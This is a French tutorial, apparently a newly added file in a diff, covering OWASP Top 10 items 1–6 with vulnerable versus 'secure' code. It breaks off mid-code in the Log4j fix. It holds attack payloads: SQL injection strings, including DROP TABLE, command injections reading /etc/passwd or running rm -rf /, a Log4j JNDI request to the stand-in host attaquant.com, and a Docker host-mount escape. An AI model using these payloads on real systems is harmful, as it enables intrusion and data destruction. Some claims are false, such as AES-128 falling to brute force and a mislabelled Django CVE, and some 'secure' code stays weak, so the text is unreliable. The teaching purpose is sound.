@@ -1,1 +1,522 @@
+Voici une **liste détaillée et concrète** des **10 vulnérabilités du Top 10 OWASP 2021**, avec :
+✅ **Un exemple d’attaque réaliste** (comment un pirate exploite la faille)
+✅ **Le code vulnérable vs sécurisé** (en Python, JavaScript, SQL, etc.)
+✅ **Le résultat/impact** (ce que l’attaquant peut faire)
+✅ **Comment le détecter** (outils et méthodes)
+✅ **Comment le corriger** (bonnes pratiques)
 
+---
+
+---
+
+## **🔴 Top 10 OWASP 2021 – Exemples Concrets, Codes et Impacts**
+
+---
+
+### **🥇 1. Broken Access Control (Contrôle d’accès défaillant)**
+**🔹 Qu’est-ce que c’est ?**
+Un attaquant accède à des fonctionnalités ou données **sans autorisation** (ex : modifier le profil d’un autre utilisateur, accéder à l’admin panel).
+
+---
+
+#### **🔴 Exemple d’attaque : Modification d’ID utilisateur**
+**Scénario :**
+Un site e-commerce utilise des **IDs numériques séquentiels** pour les utilisateurs.
+Un attaquant modifie l’ID dans l’URL pour accéder au compte d’un autre utilisateur.
+
+| **Requête HTTP** | **Résultat** |
+|------------------|-------------|
+| `GET /profile?id=123` | Affiche le profil de l’utilisateur **123** (vous). |
+| `GET /profile?id=124` | **⚠️ Affiche le profil de l’utilisateur 124** (si le contrôle d’accès est mal implémenté). |
+
+---
+
+#### **💻 Code Vulnérable (Python + Flask)**
+```python
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+# ❌ DANGER : Pas de vérification d'autorisation
+@app.route('/profile')
+def get_profile():
+    user_id = request.args.get('id')  # Récupère l'ID depuis l'URL
+    # Requête SQL SANS vérification que l'utilisateur a le droit d'accéder à cet ID
+    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
+    user = cursor.fetchone()
+    return jsonify(user)
+```
+
+**🔴 Résultat de l’attaque :**
+- L’attaquant change `id=123` en `id=1` et accède au compte admin.
+- **Impact** : Vol de données personnelles, modification de mots de passe, achats frauduleux.
+
+---
+
+#### **✅ Code Sécurisé (avec vérification d’accès)**
+```python
+from flask import Flask, request, jsonify, abort
+
+app = Flask(__name__)
+
+@app.route('/profile')
+def get_profile():
+    # 1. Récupérer l'ID de l'utilisateur connecté (stocké en session)
+    current_user_id = session.get('user_id')
+
+    # 2. Récupérer l'ID demandé dans l'URL
+    requested_user_id = request.args.get('id')
+
+    # 3. Vérifier que l'utilisateur a le droit d'accéder à cet ID
+    if current_user_id != requested_user_id:
+        abort(403, "Accès refusé : vous ne pouvez accéder qu'à votre propre profil.")
+
+    # 4. Requête SQL sécurisée
+    cursor.execute("SELECT * FROM users WHERE id = %s", (requested_user_id,))
+    user = cursor.fetchone()
+    return jsonify(user)
+```
+
+**🔹 Outils pour détecter cette faille :**
+- **OWASP ZAP** (scan d’accès non autorisés)
+- **Burp Suite** (interception des requêtes et modification des paramètres)
+- **Tests manuels** : Essayer de changer `id=1` en `id=2` et voir si l’accès est autorisé.
+
+**🔹 Autres exemples d’exploitation :**
+| **Type d’attaque** | **Exemple** | **Impact** |
+|---------------------|-------------|------------|
+| **Forced Browsing** | Accès à `/admin` sans être admin. | Prise de contrôle du site. |
+| **Insecure Direct Object Reference (IDOR)** | Modification de l’URL pour accéder à `/user/123/edit` en tant qu’utilisateur 124. | Suppression de données, modification de profils. |
+| **Horizontal Privilege Escalation** | Un utilisateur "client" accède aux données d’un autre client. | Vol de données sensibles (numéros de carte, adresses). |
+
+---
+
+---
+
+### **🥈 2. Cryptographic Failures (Échecs de chiffrement)**
+**🔹 Qu’est-ce que c’est ?**
+Utilisation de **chiffrement faible ou absent**, exposition de données sensibles (mots de passe, clés API, données personnelles).
+
+---
+
+#### **🔴 Exemple d’attaque : Fuite de mots de passe en clair**
+**Scénario :**
+Un site stocke les mots de passe **en clair** dans la base de données.
+Un attaquant qui pirate la base de données récupère **tous les mots de passe**.
+
+| **Base de données vulnérable** | **Base de données sécurisée** |
+|-------------------------------|-------------------------------|
+| `id | username | password` | `id | username | password_hash` |
+| `1  | alice    | "azerty123"` | `1  | alice    | $2b$12$N9qo8uLOickgx2ZMRZoMy...` (bcrypt) |
+
+---
+
+#### **💻 Code Vulnérable (Stockage de mot de passe en clair)**
+```python
+# ❌ DANGER : Stockage du mot de passe en clair
+@app.route('/register', methods=['POST'])
+def register():
+    username = request.form['username']
+    password = request.form['password']  # ⚠️ Stocké directement en DB
+
+    # Insertion en base de données
+    cursor.execute(
+        "INSERT INTO users (username, password) VALUES (%s, %s)",
+        (username, password)  # ❌ Mauvais !
+    )
+    return "Inscription réussie."
+```
+
+**🔴 Résultat de l’attaque :**
+- Si la base de données est piratée, **tous les mots de passe sont exposés**.
+- Les attaquants peuvent **réutiliser les mots de passe** sur d’autres sites (credential stuffing).
+- **Impact** : Prise de contrôle de comptes, fraudes financières.
+
+---
+
+#### **✅ Code Sécurisé (Hashage du mot de passe)**
+```python
+import bcrypt  # Librairie recommandée pour le hachage
+
+@app.route('/register', methods=['POST'])
+def register():
+    username = request.form['username']
+    password = request.form['password'].encode('utf-8')
+
+    # 1. Générer un sel et hacher le mot de passe
+    hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())
+
+    # 2. Stocker uniquement le hash
+    cursor.execute(
+        "INSERT INTO users (username, password) VALUES (%s, %s)",
+        (username, hashed_password.decode('utf-8'))  # ✅ Stockage sécurisé
+    )
+    return "Inscription réussie."
+```
+
+**🔹 Vérification du mot de passe :**
+```python
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password'].encode('utf-8')
+
+    # 1. Récupérer le hash stocké en DB
+    cursor.execute("SELECT password FROM users WHERE username = %s", (username,))
+    stored_hash = cursor.fetchone()[0].encode('utf-8')
+
+    # 2. Vérifier le mot de passe
+    if bcrypt.checkpw(password, stored_hash):
+        return "Connexion réussie."
+    else:
+        return "Identifiants incorrects.", 401
+```
+
+**🔹 Autres échecs de chiffrement courants :**
+| **Faille** | **Exemple** | **Impact** |
+|------------|-------------|------------|
+| **HTTP au lieu de HTTPS** | Formulaire de login en `http://` → interception des données. | Vol de sessions, mots de passe. |
+| **Chiffrement faible (AES-128 au lieu de AES-256)** | Une clé de 128 bits peut être cassée par brute force. | Décryptage des données. |
+| **Exposition de clés API dans le code** | `const API_KEY = "sk_live_12345";` dans un fichier JavaScript. | Usurpation d’identité, accès aux services cloud. |
+
+**🔹 Outils pour détecter :**
+- **SSL Labs** ([https://www.ssllabs.com/](https://www.ssllabs.com/)) → Vérifie la force du chiffrement HTTPS.
+- **TruffleHog** → Scanne les fuites de secrets dans le code.
+- **OWASP Dependency-Check** → Détecte les librairies avec chiffrement faible.
+
+---
+
+---
+
+### **🥉 3. Injection (SQL, NoSQL, Commande, etc.)**
+**🔹 Qu’est-ce que c’est ?**
+Un attaquant **injecte du code malveillant** (SQL, JavaScript, commandes système) via des entrées non validées.
+
+---
+
+#### **🔴 Exemple d’attaque : Injection SQL (Login Bypass)**
+**Scénario :**
+Un formulaire de login utilise une requête SQL **non sécurisée**.
+Un attaquant entre :
+```sql
+' OR '1'='1' --
+```
+→ **Bypass le login** et accède au compte admin.
+
+| **Requête SQL vulnérable** | **Résultat** |
+|----------------------------|--------------|
+| `SELECT * FROM users WHERE username = 'admin' AND password = 'password123'` | ❌ Aucun utilisateur trouvé. |
+| `SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = 'n'importe'` | ✅ **Retourne TOUS les utilisateurs** (car `'1'='1'` est toujours vrai). |
+
+---
+
+#### **💻 Code Vulnérable (Injection SQL)**
+```python
+# ❌ DANGER : Requête SQL avec concaténation de chaînes
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    # ⚠️ Requête SQL vulnérable aux injections
+    cursor.execute(
+        f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+    )
+    user = cursor.fetchone()
+
+    if user:
+        return "Connexion réussie."
+    else:
+        return "Identifiants incorrects.", 401
+```
+
+**🔴 Résultat de l’attaque :**
+- **Bypass du login** → Accès à n’importe quel compte.
+- **Extraction de données** → `admin' --` peut retourner tous les utilisateurs.
+- **Suppression de données** → `'; DROP TABLE users; --` (attaque **DROP TABLE**).
+- **Exécution de commandes système** (si l’application utilise des commandes shell).
+
+**🔴 Payloads d’attaque courants :**
+| **Type d’injection** | **Payload** | **Impact** |
+|----------------------|-------------|------------|
+| **Login Bypass** | `' OR '1'='1' --` | Accès à n’importe quel compte. |
+| **Extraction de données** | `' UNION SELECT 1, username, password FROM users --` | Récupération de tous les mots de passe. |
+| **Suppression de données** | `'; DROP TABLE users; --` | Effacement de la table `users`. |
+| **Exécution de commandes** | `'; cat /etc/passwd; --` | Lecture de fichiers système. |
+
+---
+
+#### **✅ Code Sécurisé (Requêtes paramétrées)**
+```python
+# ✅ SÉCURISÉ : Utilisation de paramètres préparés
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    # Requête SQL avec paramètres (échappe automatiquement les injections)
+    cursor.execute(
+        "SELECT * FROM users WHERE username = %s AND password = %s",
+        (username, password)  # ⚠️ Ne jamais concaténer !
+    )
+    user = cursor.fetchone()
+
+    if user:
+        return "Connexion réussie."
+    else:
+        return "Identifiants incorrects.", 401
+```
+
+**🔹 Autres types d’injections :**
+| **Type** | **Exemple** | **Code vulnérable** | **Code sécurisé** |
+|----------|-------------|---------------------|-------------------|
+| **XSS (Cross-Site Scripting)** | `<script>alert('Hacké !')</script>` | `innerHTML = userInput` | `DOMPurify.sanitize(userInput)` |
+| **Command Injection** | `; rm -rf /` | `os.system(f"ping {host}")` | `subprocess.run(["ping", host])` |
+| **NoSQL Injection** | `{"username": {"$ne": ""}, "password": {"$ne": ""}}` | `db.users.find(query)` | Utiliser des requêtes paramétrées (MongoDB avec `$eq`). |
+
+**🔹 Outils pour détecter :**
+- **SQLMap** → Outil automatisé pour tester les injections SQL.
+- **OWASP ZAP** → Scan des vulnérabilités d’injection.
+- **ESLint (pour XSS)** → Détecte les `innerHTML` non sécurisés.
+
+---
+
+---
+
+### **🏅 4. Insecure Design (Conception non sécurisée)**
+**🔹 Qu’est-ce que c’est ?**
+Une **mauvaise architecture** qui permet des attaques, même avec du code sécurisé.
+Exemples : **Pas de limite de tentatives de login**, **pas de vérification de l’âge pour un site pour adultes**, **pas de chiffrement des données sensibles**.
+
+---
+
+#### **🔴 Exemple d’attaque : Brute Force sur un login sans limite**
+**Scénario :**
+Un site n’a **pas de limite de tentatives de login**.
+Un attaquant utilise un **bot** pour essayer des milliers de mots de passe.
+
+| **Requête HTTP** | **Résultat** |
+|------------------|-------------|
+| `POST /login` avec `{"username": "admin", "password": "password1"}` | ❌ Échec |
+| `POST /login` avec `{"username": "admin", "password": "password2"}` | ❌ Échec |
+| ... | ... |
+| `POST /login` avec `{"username": "admin", "password": "azerty123"}` | ✅ **Connexion réussie** (si le mot de passe est faible). |
+
+**🔴 Résultat de l’attaque :**
+- **Prise de contrôle du compte admin** si le mot de passe est faible.
+- **DDoS** si le site n’a pas de protection contre les attaques par force brute.
+
+---
+
+#### **💻 Code Vulnérable (Pas de limite de tentatives)**
+```python
+# ❌ DANGER : Pas de protection contre le brute force
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    cursor.execute(
+        "SELECT * FROM users WHERE username = %s AND password = %s",
+        (username, password)
+    )
+    user = cursor.fetchone()
+
+    if user:
+        return "Connexion réussie."
+    else:
+        return "Identifiants incorrects.", 401  # ⚠️ Pas de blocage après X tentatives
+```
+
+**🔴 Autres exemples de conception non sécurisée :**
+| **Faille** | **Exemple** | **Impact** |
+|------------|-------------|------------|
+| **Pas de vérification de l’âge** | Un site pour adultes sans contrôle d’âge → amendes RGPD. | Sanctions légales. |
+| **Pas de limite de débit (Rate Limiting)** | Un attaquant envoie 10 000 requêtes par seconde → crash du serveur. | Déni de service (DoS). |
+| **Pas de chiffrement des données sensibles** | Un site de e-commerce stocke les numéros de carte en clair. | Vol de données clients (amende jusqu’à 4% du CA). |
+
+---
+#### **✅ Code Sécurisé (Avec protection contre le brute force)**
+```python
+from flask_limiter import Limiter
+from flask_limiter.util import get_remote_address
+
+limiter = Limiter(
+    app=app,
+    key_func=get_remote_address,  # Limite par IP
+    default_limits=["5 per minute"]  # 5 tentatives par minute
+)
+
+@app.route('/login', methods=['POST'])
+@limiter.limit("5 per minute")  # Limite de 5 tentatives par minute
+def login():
+    username = request.form['username']
+    password = request.form['password']
+
+    cursor.execute(
+        "SELECT * FROM users WHERE username = %s AND password = %s",
+        (username, password)
+    )
+    user = cursor.fetchone()
+
+    if user:
+        return "Connexion réussie."
+    else:
+        return "Identifiants incorrects. 5 tentatives restantes.", 401
+```
+
+**🔹 Autres bonnes pratiques pour un design sécurisé :**
+| **Bonnes pratiques** | **Exemple** |
+|----------------------|-------------|
+| **Utiliser des tokens courts (JWT avec expiration)** | `exp: 3600` (1h) au lieu de `exp: null`. |
+| **Implémenter un système de 2FA** | SMS, authentificateur (Google Authenticator). |
+| **Chiffrer les données sensibles en base** | `AES-256` pour les numéros de carte. |
+| **Valider les entrées côté client ET serveur** | Même si le frontend valide, le backend doit aussi le faire. |
+
+**🔹 Outils pour détecter :**
+- **OWASP ZAP** → Scan des failles de conception (ex : absence de rate limiting).
+- **Architecture Review** → Faire auditer le design par un expert sécurité.
+
+---
+
+---
+### **🏆 5. Security Misconfiguration (Mauvaise configuration)**
+**🔹 Qu’est-ce que c’est ?**
+Une **configuration par défaut dangereuse** ou une **mauvaise gestion des permissions**.
+
+---
+#### **🔴 Exemple d’attaque : Exposition d’un bucket S3 public**
+**Scénario :**
+Un développeur configure un **bucket AWS S3** pour stocker des images de profil.
+Par défaut, le bucket est **public** et accessible via :
+`https://mon-site.s3.amazonaws.com/profil.jpg`
+
+Un attaquant liste tous les fichiers :
+```bash
+aws s3 ls s3://mon-site/ --recursive
+```
+→ **Téléchargement de toutes les photos de profil**, y compris des documents sensibles.
+
+**🔴 Résultat de l’attaque :**
+- **Fuite de données personnelles** (photos, documents).
+- **Violation du RGPD** (amende jusqu’à 4% du CA).
+- **Usurpation d’identité** si des photos de passeport sont exposées.
+
+---
+#### **💻 Code Vulnérable (Configuration AWS S3)**
+```bash
+# ❌ DANGER : Bucket S3 public (par défaut)
+aws s3api create-bucket --bucket mon-site
+aws s3api put-bucket-policy --bucket mon-site --policy '{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Allow",
+    "Principal": "*",
+    "Action": "s3:GetObject",
+    "Resource": "arn:aws:s3:::mon-site/*"
+  }]
+}'
+```
+
+**🔴 Autres exemples de mauvaise configuration :**
+| **Faille** | **Exemple** | **Impact** |
+|------------|-------------|------------|
+| **Docker avec accès root** | `docker run -it --rm -v /:/host ubuntu bash` → accès total au système hôte. | Échappement de conteneur, prise de contrôle du serveur. |
+| **Serveur web avec des répertoires listables** | `http://mon-site.com/images/` → liste tous les fichiers. | Fuite de code source, fichiers de configuration. |
+| **Base de données avec mot de passe par défaut** | `mysql -u root -p""` → connexion sans mot de passe. | Accès total à la base de données. |
+| **API exposée sans authentification** | `GET http://api.mon-site.com/users` → retourne tous les utilisateurs. | Fuite de données. |
+
+---
+#### **✅ Code Sécurisé (Configuration AWS S3)**
+```bash
+# ✅ SÉCURISÉ : Bucket privé avec accès restreint
+aws s3api create-bucket --bucket mon-site --create-bucket-configuration LocationConstraint=eu-west-1
+
+# Politique restrictive (seul le site peut accéder)
+aws s3api put-bucket-policy --bucket mon-site --policy '{
+  "Version": "2012-10-17",
+  "Statement": [{
+    "Effect": "Deny",
+    "Principal": "*",
+    "Action": "s3:*",
+    "Resource": "arn:aws:s3:::mon-site/*",
+    "Condition": {"Bool": {"aws:SecureTransport": false}}
+  }]
+}'
+```
+
+**🔹 Autres bonnes pratiques de configuration :**
+| **Bonnes pratiques** | **Exemple** |
+|----------------------|-------------|
+| **Désactiver les méthodes HTTP dangereuses** | `TRACE`, `DELETE` dans les en-têtes Apache/Nginx. |
+| **Chiffrer les disques (EBS, EFS)** | `aws ec2 enable-ebs-encryption-by-default`. |
+| **Utiliser des certificats TLS valides** | Let’s Encrypt (`certbot`). |
+| **Désactiver le debug mode en production** | `DEBUG=False` dans Django/Flask. |
+
+**🔹 Outils pour détecter :**
+- **AWS Trusted Advisor** → Détecte les buckets S3 publics.
+- **Nmap** → Scan des ports ouverts et services exposés.
+- **OpenVAS** → Scan des vulnérabilités de configuration.
+
+---
+---
+
+### **🥇 6. Vulnerable and Outdated Components (Composants vulnérables)**
+**🔹 Qu’est-ce que c’est ?**
+Utilisation de **librairies ou frameworks obsolètes** avec des **failles connues**.
+
+---
+#### **🔴 Exemple d’attaque : Exploitation de Log4j (CVE-2021-44228)**
+**Scénario :**
+Une application Java utilise **Log4j 2.14.1** (version vulnérable).
+Un attaquant envoie une requête malveillante :
+```bash
+curl 'http://mon-site.com/login' -H 'X-Api-Version: ${jndi:ldap://attaquant.com/exploit}'
+```
+→ **Exécution de code à distance** (téléchargement d’un malware).
+
+**🔴 Résultat de l’attaque :**
+- **Prise de contrôle du serveur** (installation de ransomware, vol de données).
+- **Propagation dans le réseau interne** (si le serveur a accès à d’autres machines).
+
+---
+#### **💻 Code Vulnérable (Log4j)**
+```java
+// ❌ DANGER : Log4j 2.14.1 (vulnérable)
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class LoginController {
+    private static final Logger logger = LogManager.getLogger(LoginController.class);
+
+    public void login(String username) {
+        logger.info("Login attempt by: " + username);  // ⚠️ Vulnérable si username contient ${jndi:...}
+    }
+}
+```
+
+**🔴 Autres exemples de composants vulnérables :**
+| **Composant** | **Faille** | **Impact** |
+|---------------|------------|------------|
+| **jQuery 1.7.2** | Vulnérabilité XSS (`$(selector).html(userInput)`). | Vol de cookies, redirection malveillante. |
+| **OpenSSL 1.0.1** (Heartbleed) | Fuite de mémoire (exposition de clés privées). | Décryptage des communications. |
+| **Django 2.2** (CVE-2019-19844) | Injection SQL via `django.contrib.auth`. | Prise de contrôle de la base de données. |
+
+---
+#### **✅ Code Sécurisé (Mise à jour de Log4j)**
+```java
+// ✅ SÉCURISÉ : Log4j 2.20.0 (corrigé)
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class LoginController {
+    private static final Logger logger = LogManager.getLogger(LoginController.class);
+
+    public void login(String username) {
+        // 1. Sanitizer l'entrée utilisateur
+        String safeUsername = sanitize(username);
+
+        // 2. Utiliser un logger configuré pour éviter les injections
+        logger.info("Login attempt by: {}", safeUsername);  // ⚠️ Utiliser {} au lieu de +
+
+        
